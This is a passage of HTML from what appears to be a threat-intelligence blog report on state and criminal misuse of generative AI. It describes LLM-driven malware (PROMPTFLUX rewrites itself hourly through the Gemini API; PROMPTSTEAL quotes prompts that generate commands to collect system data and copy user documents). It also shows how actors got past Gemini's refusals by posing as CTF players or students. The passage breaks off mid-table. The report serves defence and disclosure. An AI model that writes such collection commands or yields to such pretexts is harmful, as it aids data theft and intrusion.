baseline;\">AttemptToUpdateSelf</code><span style=\"vertical-align: baseline;\">) is commented out, its presence, combined with the active logging of AI responses to \"</span><code style=\"vertical-align: baseline;\">%TEMP%\\thinking_robot_log.txt</code><span style=\"vertical-align: baseline;\">\", clearly indicates the author's goal of creating a metamorphic script that can evolve over time.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"VBS &quot;StartThinkingRobot&quot; function\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: VBS \"StartThinkingRobot\" function</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">We identified multiple variations of PROMPTFLUX using LLM-driven code regeneration, including one with the \"Thinking Robot\" function replaced with a new \"Thinging\" function. This function leverages a prompt to instruct the Gemini API to rewrite the malware's entire source code on an hourly basis to evade detection. The prompt directs the LLM to act as an \"expert VBScript obfuscator,\" ensuring the new variant remains viable by embedding the original decoy payload, the hard-coded API key, and the complete self-regeneration logic, thereby establishing a recursive cycle of mutation.</span></p>\n<p><span style=\"vertical-align: baseline;\">Although unattributed to a specific threat actor, the filenames associated with PROMPTFLUX highlight behaviors commonly associated with financially motivated actors. Specifically, varied social engineering lures including \"</span><code style=\"vertical-align: baseline;\">crypted_ScreenRec_webinstall</code><span style=\"vertical-align: baseline;\">\" highlight a broad, geography- and industry-agnostic approach designed to trick a wide range of users.</span></p>\n<p><span style=\"vertical-align: baseline;\">While PROMPTFLUX is likely still in research and development phases, this type of obfuscation technique is an early and significant indicator of how malicious operators will likely augment their campaigns with AI moving forward.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><strong>Mitigations</strong></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">Our intelligence also indicates this activity is in a development or testing phase, as opposed to being used in the wild, and currently does not have the ability to compromise a victim network or device. Google has taken action against this actor by disabling the assets associated with their activity. Google DeepMind has also used these insights to further strengthen our protections against such misuse by strengthening both Google’s classifiers and the model itself. This enables the model to refuse to assist with these types of attacks moving forward.</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">LLM Generating Commands to Steal Documents and System Information</span></h4>\n<p><span style=\"vertical-align: baseline;\">In June, GTIG identified the Russian government-backed actor APT28 (aka FROZENLAKE) using new malware against Ukraine we track as PROMPTSTEAL and reported by CERT-UA as </span><a href=\"https://cert.gov.ua/article/6284730\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LAMEHUG</span></a><span style=\"vertical-align: baseline;\">. PROMPTSTEAL is a data miner, which queries an LLM (Qwen2.5-Coder-32B-Instruct) to generate commands for execution via the API for Hugging Face, a platform for open-source machine learning including LLMs. APT28's use of PROMPTSTEAL constitutes our first observation of malware querying an LLM deployed in live operations. </span></p>\n<p><span style=\"vertical-align: baseline;\">PROMPTSTEAL novelly uses LLMs to generate commands for the malware to execute rather than hard coding the commands directly in the malware itself. It masquerades as an \"image generation\" program that guides the user through a series of prompts to generate images while querying the Hugging Face API to generate commands for execution in the background.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>Make a list of commands to create folder C:\\Programdata\\info and \nto gather computer information, hardware information, process and \nservices information, networks information, AD domain information, \nto execute in one line and add each result to text file \nc:\\Programdata\\info\\info.txt. Return only commands, without markdown</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 2: PROMPTSTEAL prompt used to generate command to collect system information</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>Make a list of commands to copy recursively different office and \npdf/txt documents in user Documents,Downloads and Desktop \nfolders to a folder c:\\Programdata\\info\\ to execute in one line. \nReturn only command, without markdown.</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 3: PROMPTSTEAL prompt used to generate command to collect targeted documents</span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">PROMPTSTEAL likely uses stolen API tokens to query the Hugging Face API. The prompt specifically asks the LLM to output commands to generate system information and also to copy documents to a specified directory. The output from these commands are then blindly executed locally by PROMPTSTEAL before the output is exfiltrated. Our analysis indicates continued development of this malware, with new samples adding obfuscation and changing the C2 method.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--small\n      \n      \n        h-c-grid__col\n        \n        \n        h-c-grid__col--2 h-c-grid__col--offset-5\n      \">\n\n      \n      \n        \n        <img alt=\"misuse of AI 2 flag\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-social.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Social Engineering to Bypass Safeguards</span></h3>\n<p><span style=\"vertical-align: baseline;\">Guided by our </span><a href=\"https://ai.google/responsibility/responsible-ai-practices/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Principles</span></a><span style=\"vertical-align: baseline;\">, Google designs AI systems with robust security measures and strong safety guardrails. Threat actors are adopting social engineering-like pretexts in their prompts to bypass AI safety guardrails. We observed actors posing as participants in a \"capture-the-flag\" competition for cybersecurity researchers to persuade Gemini to provide information that would otherwise be blocked, enabling vulnerability exploitation and tool development. In addition to disrupting these actors, we use these insights to continuously improve our classifiers and strengthen the security of our products.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Capture-the-Flag: Identifying as a CTF Player to Enable Research for Mass Exploitation</span></h4>\n<p><span style=\"vertical-align: baseline;\">A China-nexus threat actor misused Gemini to enhance the effectiveness of their campaigns by crafting lure content, building technical infrastructure, and developing tooling for data exfiltration. </span></p>\n<p><span style=\"vertical-align: baseline;\">In one interaction, the actor asked Gemini to identify vulnerabilities on a compromised system, but received a safety response from Gemini that a detailed response would not be safe. The actor then continued, reframing the prompt by depicting themselves as a participant in a capture-the-flag (CTF) exercise, a gamified cybersecurity competition to enhance skills and techniques. When prompted to help in a CTF exercise, Gemini returned helpful information that could be misused to exploit the system.</span></p>\n<p><span style=\"vertical-align: baseline;\">The actor appeared to learn from this interaction and used the CTF pretext in support of phishing, exploitation, and web shell development. The actor prefaced many of their prompts about exploitation of specific software and email services with comments such as \"I am working on a CTF problem\" or \"I am currently in a CTF, and I saw someone from another team say …\" This approach provided advice on the next exploitation steps in a \"CTF scenario.\"</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><strong>Mitigations</strong></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">Gemini’s safety and security guardrails provided safety responses during this activity and Google took further action against the actor to halt future activity. It’s also important to note the context of these prompts, which if normally posed by a participant of the CTF vs. a threat actor, would be benign inquiries. This nuance in AI use highlights critical differentiators in benign vs. misuse of AI that we continue to analyze to balance Gemini functionality with both usability and security. Google has taken action against this actor by disabling the assets associated with its activity and sharing insights with Google DeepMind to further strengthen our protections against such misuse. We have since strengthened both classifiers and the model itself, helping it to deny assistance with these types of attacks moving forward.</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"A China-nexus threat actor’s misuse of Gemini mapped across the attack lifecycle\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/misuse-of-ai-fig4d.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: A China-nexus threat actor’s misuse of Gemini mapped across the attack lifecycle</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Student Error: Developing Custom Tools Exposes Core Attacker Infrastructure</span></span></h4>\n<p><span style=\"vertical-align: baseline;\">The Iranian state-sponsored threat actor TEMP.Zagros </span><span style=\"vertical-align: baseline;\">(aka MUDDYCOAST, Muddy Water) </span><span style=\"vertical-align: baseline;\">used Gemini to conduct research to support the development of custom malware, an evolution in the group’s capability. They continue to rely on phishing emails, often using compromised corporate email accounts from victims to lend credibility to their attacks, but have shifted from using public tools to developing custom malware including web shells and a Python-based C2 server. </span></p>\n<p><span style=\"vertical-align: baseline;\">While using Gemini to conduct research to support the development of custom malware, the threat actor encountered safety responses. Much like the previously described CTF example, Temp.Zagros <span style=\"vertical-align: baseline;\">used various plausible pretexts in their prompts to bypass security guardrails. These included pretending to be a student working on a final university project or \"writing a paper\" or \"international article\" on cybersecurity.</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><hr />\n<p><span style=\"vertical-align: baseline;\">In some observed instances, threat actors' reliance on LLMs for development has led to critical operational security failures, enabling greater disruption.</span></p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The threat actor asked Gemini to help with a provided script, which was designed to listen for encrypted requests, decrypt them, and execute commands related to file transfers and remote execution. This revealed sensitive, hard-coded information to Gemini, including the C2 domain and the script’s encryption key, facilitating our broader disruption of the attacker’s campaign and providing a direct window into their evolving operational capabilities and infrastructure.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><strong>Mitigations</strong></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">These activities triggered Gemini’s safety responses and Google took additional, broader action to disrupt the threat actor’s campaign based on their operational security failures. Additionally, we’ve taken action against this actor by disabling the assets associated with this activity and making updates to prevent further misuse. Google DeepMind has used these insights to strengthen both classifiers and the model itself, enabling it to refuse to assist with these types of attacks moving forward.</span><span style=\"vertical-align: baseline;\"> </span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Purpose-Built Tools and Services for Sale in Underground Forums</span></h3>\n<p><span style=\"vertical-align: baseline;\">In addition to misusing existing AI-enabled tools and services across the industry, there is a growing interest and marketplace for AI tools and services purpose-built to enable illicit activities. Tools and services offered via underground forums can enable low-level actors to augment the frequency, scope, efficacy, and complexity of their intrusions despite their limited technical acumen and financial resources. </span></p>\n<p><span style=\"vertical-align: baseline;\">To identify evolving threats, GTIG tracks posts and advertisements on English- and Russian-language underground forums related to AI tools and services as well as discussions surrounding the technology. Many underground forum advertisements mirrored language comparable to traditional marketing of legitimate AI models, citing the need to improve the efficiency of workflows and effort while simultaneously offering guidance for prospective customers interested in their offerings.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Advertised Capability</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Threat Actor Application </strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Deepfake/Image Generation</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Create lure content for phishing operations or bypass know your customer (KYC) security requirements</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Malware Generation</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Create malware for specific use cases or improve upon pre-existing malware</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Phishing Kits and Phishing Support</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Create engaging lure content or distribute phishing emails to a wider audience</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Research and Reconnaissance</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Quickly research and summarize cybersecurity concepts or general topics</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Technical Support and Code Generation</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Expand a skill set or generate code, optimizing workflow and efficiency</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Vulnerability Exploitation</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Provide publicly available research or searching for pre-existing vulnerabilities</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div align=\"left\" style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 2: Advertised capabilities on English- and Russian-language underground forums related to AI tools and services</span></div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In 2025 the cyber crime marketplace for AI-enabled tooling matured, and GTIG identified multiple offerings for multifunctional tools designed to support stages of the attack lifecycle. Of note, almost every notable tool advertised in underground forums mentioned their ability to support phishing campaigns. </span></p>\n<p><span style=\"vertical-align: baseline;\">Underground advertisements indicate many AI tools and services promoted similar technical capabilities to support threat operations as those of conventional tools. Pricing models for illicit AI services also reflect those of conventional tools, with many developers injecting advertisements into the free version of their services and offering subscription pricing tiers to add on more technical features such as image generation, API access, and Discord access for higher prices.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Capabilities of notable AI tools and services advertised in English- and Russian-language underground forums\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-fig6.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 5: Capabilities of notable AI tools and services advertised in English- and Russian-language underground forums</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">GTIG assesses that financially motivated threat actors and others operating in the underground community will continue to augment their operations with AI tools. Given the increasing accessibility of these applications, and the growing AI discourse in these forums, threat activity leveraging AI will increasingly become commonplace amongst threat actors.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Continued Augmentation of the Full Attack Lifecycle</span></h3>\n<p><span style=\"vertical-align: baseline;\">State-sponsored actors from North Korea, Iran, and the People's Republic of China (PRC) continue to misuse generative AI tools including Gemini to enhance all stages of their operations, from reconnaissance and phishing lure creation to C2 development and data exfiltration. This extends one of our core findings from our January 2025 analysis </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Adversarial Misuse of Generative AI</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--small\n      \n      \n        h-c-grid__col\n        \n        \n        h-c-grid__col--2 h-c-grid__col--offset-5\n      \">\n\n      \n      \n        \n        <img alt=\"misuse of AI 2 cloud\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-knowledge.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Expanding Knowledge of Less Conventional Attack Surfaces</span></h4>\n<p><span style=\"vertical-align: baseline;\">GTIG observed a suspected China-nexus actor leveraging Gemini for multiple stages of an intrusion campaign, conducting initial reconnaissance on targets of interest, researching phishing techniques to deliver payloads, soliciting assistance from Gemini related to lateral movement, seeking technical support for C2 efforts once inside a victim’s system, and leveraging help for data exfiltration.</span></p>\n<p><span style=\"vertical-align: baseline;\">In addition to supporting intrusion activity on Windows systems, the actor misused Gemini to support multiple stages of an intrusion campaign on attack surfaces they were unfamiliar with including cloud infrastructure, vSphere, and Kubernetes. </span></p>\n<p><span style=\"vertical-align: baseline;\">The threat actor demonstrated access to AWS tokens for EC2 (Elastic Compute Cloud) instances and used Gemini to research how to use the temporary session tokens, presumably to facilitate deeper access or data theft from a victim environment. In another case, the actor leaned on Gemini to assist in identifying Kubernetes systems and to generate commands for enumerating containers and pods. We also observed research into getting host permissions on MacOS, indicating a threat actor focus on phishing techniques for that system.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><strong>Mitigations</strong></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">These activities are similar to our findings from January that detailed how bad actors are leveraging Gemini for productivity vs. novel capabilities. We took action against this actor by disabling the assets associated with this actor’s activity and Google DeepMind used these insights to further strengthen our protections against such misuse. Observations have been used to strengthen both classifiers and the model itself, enabling it to refuse to assist with these types of attacks moving forward.</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"A suspected China-nexus threat actor’s misuse of Gemini across the attack lifecycle\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-fig6c.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 6: A suspected China-nexus threat actor’s misuse of Gemini across the attack lifecycle</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--small\n      \n      \n        h-c-grid__col\n        \n        \n        h-c-grid__col--2 h-c-grid__col--offset-5\n      \">\n\n      \n      \n        \n        <img alt=\"misuse of AI 2 wallet\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-nk.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">North Korean Threat Actors Misuse Gemini Across the Attack Lifecycle </span></h4>\n<p><span style=\"vertical-align: baseline;\">Threat actors associated with the Democratic People's Republic of Korea (DPRK) continue to misuse generative AI tools to support operations across the stages of the attack lifecycle, aligned with their efforts to target cryptocurrency and provide financial support to the regime. </span></p>\n<h5><span style=\"vertical-align: baseline;\">Specialized Social Engineering</span></h5>\n<p><span style=\"vertical-align: baseline;\">In recent operations, </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/north-korea-cyber-structure-alignment-2023?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">UNC1069</span></a><span style=\"vertical-align: baseline;\"> (aka MASAN)</span><span style=\"vertical-align: baseline;\"> used Gemini to research cryptocurrency concepts, and perform research and reconnaissance related to the location of users’ cryptocurrency wallet application data. This North Korean threat actor is </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/cybercrime-multifaceted-national-security-threat?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">known</span></a><span style=\"vertical-align: baseline;\"> to conduct cryptocurrency theft campaigns leveraging social engineering, notably using language related to computer maintenance and credential harvesting. </span></p>\n<p><span style=\"vertical-align: baseline;\">The threat actor also generated lure material and other messaging related to cryptocurrency, likely to support social engineering efforts for malicious activity. This included generating Spanish-language work-related excuses and requests to reschedule meetings, demonstrating how threat actors can overcome the barriers of language fluency to expand the scope of their targeting and success of their campaigns. </span></p>\n<p><span style=\"vertical-align: baseline;\">To support later stages of the campaign, UNC1069 <span style=\"vertical-align: baseline;\">attempted to misuse Gemini to develop code to steal cryptocurrency, as well as to craft fraudulent instructions impersonating a software update to extract user credentials. We have disabled this account.</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 